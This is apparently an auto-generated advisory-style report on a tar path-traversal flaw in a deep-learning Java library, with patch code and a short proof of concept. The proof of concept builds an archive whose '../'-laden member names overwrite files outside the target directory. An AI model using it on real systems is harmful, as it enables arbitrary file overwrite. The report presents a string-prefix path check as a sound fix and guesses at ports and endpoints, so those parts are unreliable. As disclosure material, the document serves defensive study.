# CVE-2024-2914 Detailed Report

## Summary
CVE-2024-2914 is a vulnerability identified in the deepjavalibrary/djl, specifically affecting version 0.26.0. The vulnerability is classified as a Path Traversal vulnerability (CWE-29), which allows an attacker to manipulate file paths within tar archives. This manipulation can lead to the overwriting of arbitrary files on the target system, potentially resulting in severe consequences such as remote code execution, privilege escalation, data theft, or denial of service.

## Root Cause of the Vulnerability
The root cause of the vulnerability lies in the improper validation of file paths during the extraction of tar files. The affected code does not adequately check whether the extracted file paths are within a safe directory, allowing attackers to exploit this weakness by crafting malicious tar files. 

The provided patch demonstrates the intended fix, which introduces a `safe_extract` function that checks if the target extraction path is within a specified directory. If the path is outside the allowed directory, an exception is raised, preventing the extraction of potentially malicious files. The original code, however, directly called `tar.extractall(path=path)`, which did not perform any such validation, thus leaving the system vulnerable.

### Code Analysis
The relevant code from the patch is as follows:
```python
def is_within_directory(directory, target):
    abs_directory = os.path.abspath(directory)
    abs_target = os.path.abspath(target)
    prefix = os.path.commonprefix([abs_directory, abs_target])
    return prefix == abs_directory

def safe_extract(tar, path=".", members=None, *, numeric_owner=False):
    for member in tar.getmembers():
        member_path = os.path.join(path, member.name)
        if not is_within_directory(path, member_path):
            raise Exception("Attempted Path Traversal in Tar File")
    tar.extractall(path, members, numeric_owner=numeric_owner)
```
This code ensures that any file being extracted is checked against the base directory, thus mitigating the risk of path traversal.

## Exploitation Details
To exploit this vulnerability, an attacker would create a malicious tar file that contains files with paths designed to traverse the directory structure. The attacker would then trick a victim into extracting this tar file using the vulnerable version of the djl library.

### Steps to Exploit
1. **Create a Malicious Tar File**: The attacker creates a tar file that includes a file with a path that traverses outside the intended extraction directory.
   ```python
   import os
   import tarfile

   malicious_dir = '/home/anis/Desktop'
   with tarfile.open('tarslip.tar', 'w') as tar:
       tar.add('sensitive_file', arcname=f'../../../../../..{malicious_dir}/sensitive_file')
   ```

2. **Extract the Malicious File**: The victim uses the vulnerable `extract_train` function from the djl library to extract the tar file, which will lead to the overwriting of files in the specified malicious directory.

3. **Achieve Arbitrary File Overwrite**: By carefully crafting the contents of the tar file, the attacker can overwrite critical files, potentially leading to remote code execution or other malicious activities.

## Environment Setup Requirements
- **Port**: Not explicitly mentioned in the advisory, but typically, the djl library operates on standard ports for HTTP/HTTPS services.
- **Target Endpoint**: The advisory does not specify an exact API path, but the vulnerable function can be invoked through the library's methods that handle model downloads and extractions.
- **Explicit Configuration**: No specific startup flags or environment variables are mentioned in the advisory.

## Complete PoC Code
The following proof-of-concept code is provided in the advisory for creating and extracting the malicious tar file:

### Create Malicious Tar File
```python
import os
import tarfile

# Specify the directory where the malicious script will be placed
malicious_dir = '/home/anis/Desktop'

# Create the TAR archive with the malicious file
with tarfile.open('tarslip.tar', 'w') as tar:
    # Add the malicious script to the TAR archive with the desired path outside the target directory
    tar.add('sensitive_file', arcname=f'../../../../../..{malicious_dir}/sensitive_file')
```

### Extract Malicious File
```python
import os
import tarfile
from tqdm import tqdm

def extract_train(tar_fname, target_dir, with_rec=False, num_thread=1):
    os.makedirs(target_dir, exist_ok=True)
    with tarfile.open(tar_fname) as tar:
        print("Extracting " + tar_fname + "...")
        pbar = tqdm(total=len(tar.getnames()))
        for class_tar in tar:
            pbar.set_description('Extract ' + class_tar.name)
            tar.extract(class_tar, target_dir)
            class_fname = os.path.join(target_dir, class_tar.name)
            class_dir = os.path.splitext(class_fname)[0]
            os.makedirs(class_dir, exist_ok=True)
            with tarfile.open(class_fname) as f:
                def is_within_directory(directory, target):
                    abs_directory = os.path.abspath(directory)
                    abs_target = os.path.abspath(target)
                    prefix = os.path.commonprefix([abs_directory, abs_target])
                    return prefix == abs_directory

                def safe_extract(tar, path=".", members=None, *, numeric_owner=False):
                    for member in tar.getmembers():
                        member_path = os.path.join(path, member.name)
                        if not is_within_directory(path, member_path):
                            raise Exception("Attempted Path Traversal in Tar File")
                    tar.extractall(path, members, numeric_owner=numeric_owner)

                safe_extract(f, class_dir)
            os.remove(class_fname)
            pbar.update(1)
        pbar.close()

if __name__ == "__main__":
    extract_train("tarslip.tar", "tmp")
```

This code demonstrates how to create a malicious tar file and how to extract it using the vulnerable function, leading to potential exploitation of the vulnerability.